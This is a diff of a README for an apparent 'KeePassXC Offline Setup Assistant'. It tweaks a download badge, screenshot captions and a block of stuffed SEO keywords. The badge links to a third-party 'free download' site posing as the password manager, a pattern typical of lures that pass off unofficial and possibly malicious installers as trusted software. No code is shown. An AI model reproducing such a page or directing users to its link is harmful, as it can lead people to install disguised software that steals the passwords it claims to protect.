@@ -1,6 +1,6 @@
 # KeePassXC — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/⬇️ Download%20Setup%20Assistant-Click%20Here-brightgreen?style=for-the-badge)](https://keepassxc-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://keepassxc-free-download.github.io/.github)
 
 ## ⚙️ How to Use
 
@@ -20,15 +20,15 @@
 
 ## 🖼 Preview
 
-![KeePassXC App Preview](https://flathub.org/api/appOgImage/org.keepassxc.KeePassXC?locale=en)  
-*Modern and clean interface for managing secure data*
+![KeePassXC Main Interface](https://flathub.org/api/appOgImage/org.keepassxc.KeePassXC?locale=en)  
+*Cross-platform interface with password groups and search*
 
-![KeePassXC Saved Search View](https://keepassxc.org/blog/images/2.7.3_saved_search.png)  
-*Quick access to saved and filtered entries*
+![KeePassXC Entry Creation](https://keepassxc.org/blog/images/2.7.3_saved_search.png)  
+*Add secure entries with attachments and custom fields*
 
-![KeePassXC Entry Creation](https://ssd.eff.org/files/ssd/wysiwyg/pictures/44/content_3._adding_an_entry.png)  
-*Easy and customizable entry creation with encryption*
+![KeePassXC Auto-Type & Integration](https://ssd.eff.org/files/ssd/wysiwyg/pictures/44/content_3._adding_an_entry.png)  
+*Advanced auto-type and system integration settings*
 
 ## 🔍 SEO Keywords
 
-keepassxc, keepassxc install, keepassxc download, keepassxc git, keepassxc 2fa, keepassxc android, keepassxc password manager, password manager keepassxc, 2fa keepassxc, bitwarden to keepassxc, chrome keepassxc, download keepass xc, fido2 keepassxc, https keepassxc org, install keepassxc, offline keepassxc installer, keepassxc secure vault, portable keepassxc version, keepassxc no internet setup, linux keepassxc install, keepassxc mac integration, keepassxc windows setup, open source password vault, encrypted database manager, local password tool
+keepassxc, keepassxc download, keepass xc setup, keepassxc install, keepass password manager, keepassxc offline, open source password manager, offline password tool, keepassxc linux, keepassxc macos, keepassxc windows, portable keepassxc, encrypted password vault, keepass database setup, keepass assistant, keepassxc no internet, cross-platform password tool, secure password storage, airgapped password manager, keepassxc local database, keepassxc config, keepassxc install without network, password manager offline assistant, keepass secure setup, offline credential manager
